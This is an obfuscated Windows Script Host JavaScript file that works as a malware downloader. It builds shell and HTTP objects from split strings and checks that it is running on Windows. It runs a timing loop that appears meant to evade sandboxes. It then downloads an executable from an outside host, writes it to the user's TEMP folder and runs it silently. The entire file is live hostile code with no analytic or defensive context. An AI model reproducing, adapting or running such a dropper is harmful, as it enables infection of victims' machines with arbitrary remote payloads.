var X0 = false;
var F = "Create"+"Object";
var XK0 = function D() {return WScript[F]("WScript"+".Shell");}(), LM = 11;
var LN = "MSXML2"+".XMLHTTP";
var SD = 2;
var J = SD - 2;
function X(P){XK0["Run"](P, J, J);};
function PN(){return LN + "";};
function S(C, G3){J = J * 1; return C - G3;};
function LL(){return F;};
/*@cc_on
  @if (@_win32 || @_win64)
    X0 = true;
  @end
@*/
if (X0)
{
var XK = "";
function FL(){return 22;};
var D0 = 0; var KQ = 0;
function M()
{
var SM = new this["Date"]();
var G1 = SM["getUTCMilliseconds"]();
WScript["Sleep"](FL());
var SM = new this["Date"]();
var G0 = SM["getUTCMilliseconds"]();
WScript["Sleep"](FL());
var SM = new this["Date"]();
var AE = SM["getUTCMilliseconds"]();
var D0 = "H";
D0 = S(G0, G1);
var KQ = "QL";
KQ = S(AE, G0);
XK = "open";
return S(D0, KQ);
}
var Y0 = false;
var EE = false;
for (var A = J; A < FL() * 1; A++){if (M() != J){
Y0 = true; 
KQ = "31" + 11 * D0 + KQ; 
EE = true; 
break;
}}
function UX() {return ((Y0 == true) && (Y0 == EE)) ? 1 : J;};
if (Y0 && UX() && EE){
function G() {return XK0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "j7J0GBHe8ov.ex" + "e";};
 W = PN();
 PX = WScript[F](W);
 var Y = 1;
do { 
	for (;Y;){
	try {
		if (Y == 1)
		{
			PX[XK]("GET", "http://buygrocery.nz/l7dsp", false);
			PX["send"]();
			V = "Sleep";
			Y = 2;
		}
		WScript[V](FL() + 120); 
		if (PX["readystate"] < 2 * 2) continue;
		Y = J;
		function B(T) {var HY = (1, 2, 3, 4, 5, T); return HY;};
		Z = WScript[LL()]("ADODB.Stream");
		W = Z;
		W[XK]();
		W["type"] = B(1);
		W["write"](PX["ResponseBody"]);
		Z["position"] = B(J);
		W["Save" + "ToFile"](G(), 2);
		Z["cl"+"ose"]();
		NU = G();
		X(NU);
	} catch(G2){};};
}while (Y);
}
}

